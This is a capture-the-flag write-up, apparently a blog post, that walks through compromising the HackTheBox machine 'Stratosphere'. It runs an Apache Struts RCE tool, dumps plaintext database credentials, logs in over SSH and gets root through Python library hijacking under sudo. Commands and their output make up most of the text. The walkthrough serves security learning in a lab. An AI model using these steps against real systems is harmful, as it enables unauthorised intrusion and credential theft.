<p>When we go to <code class="highlighter-rouge">http://10.10.10.64/Monitoring</code>, we find ourselves redirected to <code class="highlighter-rouge">http://10.10.10.64/Monitoring/example/Welcome.action</code> :</p>

<p><img src="/imgs/straction.png" alt="Action" class="img-responsive"></p>

<p>Never saw this .action extension before. Letâ€™s browse the internet and see what we can come up with against this.</p>

<p>Well, letâ€™s try <a href="https://github.com/mazen160/struts-pwn">mazen160</a>â€™s python code first to see if we can get anywhere.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12</pre></td>
<td class="code"><pre class="highlight"><code>./struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--&gt; ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Aaaand there we go. We now have RCE.</p>

<h2 id="exploitation">Exploitation</h2>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11</pre></td>
<td class="code"><pre class="highlight"><code>ls

conf
db_connect
lib
logs
policy
webapps
work

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>This db_connect file gets me all pumpâ€™d up. Letâ€™s find out whatâ€™s inside.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11</pre></td>
<td class="code"><pre class="highlight"><code>cat db_connect

[ssn]
user=ssn_admin
pass=AWs64@on*&amp;

[users]
user=admin
pass=admin

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Looks nice! After I tried getting in through SSH with those creds (and with no luck), I thought that maybe they are some creds for some kind of mysql db, since apache struts needs it?</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5</pre></td>
<td class="code"><pre class="highlight"><code>mysql -u admin -p admin -e 'show databases'

ERROR

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>This is where I actually got stuck for about an hour. Trying to pass the right command with the right syntax so I could enumerate more and exploit the MySql db. Finally, I stumbled upon <a href="https://dev.mysql.com/doc/refman/8.0/en/mysql-command-options.html">this page</a> and more precisely this bit of information:</p>

<p><code class="highlighter-rouge">--password[=password], -p[password]</code></p>

<p><code class="highlighter-rouge">The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql prompts for one.</code></p>

<p>Fuck you, MySql. Letâ€™s get back to the exploitation part now that we know how fuckâ€™d up this is.</p>

<p>In a nutshell,  we have to put no space between the -p option and the actual password.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7</pre></td>
<td class="code"><pre class="highlight"><code>mysql -u admin -padmin -e 'show databases'

Database
information_schema
users

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>There we go! Finally. Letâ€™s see whatâ€™s inside, shall we?</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6</pre></td>
<td class="code"><pre class="highlight"><code>mysql -u admin -padmin -D users -e 'show tables'

Tables_in_users
accounts

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Only one table, eh? This should be interesting.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6</pre></td>
<td class="code"><pre class="highlight"><code>mysql -u admin -padmin -D users -e 'select * from accounts'

fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard

[%] Done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Oh, oh, motherfucking oh! This looks like pwnâ€™d user to me! Letâ€™s try to SSH in with those creds now.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4</pre></td>
<td class="code"><pre class="highlight"><code>~# sshpass -p '9tc*rhKuG5TyXvUJOrE^5CK7k' ssh richard@10.10.10.64
richard@stratosphere:~$ cat user.txt 
e610b298611fa732fca1665a1c02336b
richard@stratosphere:~$ 
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Yep, that was it! User pwnâ€™d, hash was <code class="highlighter-rouge">e610b298611fa732fca1665a1c02336b</code>.</p>

<h2 id="privilege-escalation">Privilege escalation</h2>

<p>First things first, a sudo -l as usual.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6</pre></td>
<td class="code"><pre class="highlight"><code>~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>I mean, cmonâ€¦ This is starting to look easy now. Maybe a library hijacking?</p>

<p>Letâ€™s find out by looking inside test.py.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table style="border-spacing: 0"><tbody><tr>
<td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38</pre></td>
<td class="code"><pre><span class="c">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">hashlib</span>


<span class="k">def</span> <span class="nf">question</span><span class="p">():</span>
    <span class="n">q1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Solve: 5af003e100c80923ec04d65933d382cb</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
    <span class="n">md5</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q1</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">md5</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">"5af003e100c80923ec04d65933d382cb"</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Sorry, that's not right"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"You got it!"</span><span class="p">)</span>
    <span class="n">q2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sha1</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
    <span class="n">sha1</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q2</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">sha1</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'d24f6fb449855ff42344feff18ee2819033529ff'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Nope, that one didn't work..."</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"WOW, you're really good at this!"</span><span class="p">)</span>
    <span class="n">q3</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"How about this? 91ae5fc9ecbca9d346225063f23d2bd9</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">md4</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md4'</span><span class="p">)</span>
    <span class="n">md4</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q3</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">md4</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'91ae5fc9ecbca9d346225063f23d2bd9'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Yeah, I don't think that's right."</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"OK, OK! I get it. You know how to crack hashes..."</span><span class="p">)</span>
    <span class="n">q4</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">blake</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'BLAKE2b512'</span><span class="p">)</span>
    <span class="n">blake</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">q4</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">blake</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s">'9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"You were so close! urg... sorry rules are rules."</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="kn">import</span> <span class="nn">os</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/root/success.py'</span><span class="p">)</span>
    <span class="k">return</span>

<span class="n">question</span><span class="p">()</span><span class="w">
</span></pre></td>
</tr></tbody></table></code></pre></figure>

<p>Yeah, noâ€¦ I ainâ€™t going to answer all those questions, pal. Iâ€™d rather hijack this pretty hashlib library of yours.</p>

<p>For those of you who donâ€™t know how this whole hijacking works, <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">check this out</a>.</p>

<p>Letâ€™s continue : I created a hashlib.py file in the same directory as this test.py script and added a single line in it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span></code></pre></figure>

<p>Ready to see the magic?</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5</pre></td>
<td class="code"><pre class="highlight"><code>~$ sudo python /home/richard/test.py
root@stratosphere:/home/richard# id
uid=0(root) gid=0(root) groups=0(root)
root@stratosphere:/home/richard# cat /root/root.txt
d41d8cd98f00b204e9800998ecf8427e
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Aaaand thatâ€™s it! Root pwnâ€™d. Hash was : <code class="highlighter-rouge">d41d8cd98f00b204e9800998ecf8427e</code></p>

<h2 id="after-thoughts">After thoughts</h2>

<p>Very nice box with new elements in it such as the Apache Struts exploitation. I already did a few libraries hijacking and the rest of it (enumeration, gobuster, sudo -l) was pretty easy. If I need to be really honest, what took me the most time on this machine was actually MySqlâ€™s fucked up syntax!</p>


      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            
            <a href="/tag/#/hackthebox" rel="tag"># hackthebox</a>
          
            
            <a href="/tag/#/write-up" rel="tag"># write-up</a>
          
            
            <a href="/tag/#/linux-box" rel="tag"># linux-box</a>
          
        </div>
      

      
      
      
      
      

      
      
        <div class="post-nav" id="post-nav-id">
          <div class="post-nav-next post-nav-item">
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/08/23/TJCTF-Write-Up-Ssleepy/" rel="prev" title="TJCTF - Ssleepy">
                TJCTF - Ssleepy <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      
      

      
    </footer>
  </article>

  <div class="post-spread">
    
  </div>
</div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          

  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        
        
        







      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/assets/images/avatar.gif" alt="Pxmme">
          <p class="site-author-name" itemprop="name">Pxmme</p>
           
              <p class="site-description motion-element" itemprop="description">Cybersec enthusiast.</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/">
                <span class="site-state-item-count">12</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
        
        

        <div class="links-of-author motion-element">
          
            
              
              
              <span class="links-of-author-item">
                <a href="https://github.com/pxmme" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://twitter.com/prxph3t" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://www.hackthebox.eu/profile/20490" target="_blank" title="HackTheBox">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  HackTheBox
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            








            
              <div class="post-toc-content">
    <ol class="nav">
      <li class="nav-item nav-level-2"> <a class="nav-link" href="#target"> <span class="nav-number">1</span> <span class="nav-text">Target</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#enumeration"> <span class="nav-number">2</span> <span class="nav-text">Enumeration</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#exploitation"> <span class="nav-number">3</span> <span class="nav-text">Exploitation</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-number">4</span> <span class="nav-text">Privilege escalation</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#after-thoughts"> <span class="nav-number">5</span> <span class="nav-text">After thoughts</span> </a> </li>
    </ol>
  </div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>

        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  
  Â© 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Pxmme</span>
</div>



        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>





















  
   
  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>



  
  

  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>


  


  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>



  


  




	





  











  




  

    

  





  






  

  

  
  


  

  

  

</body>
</html>
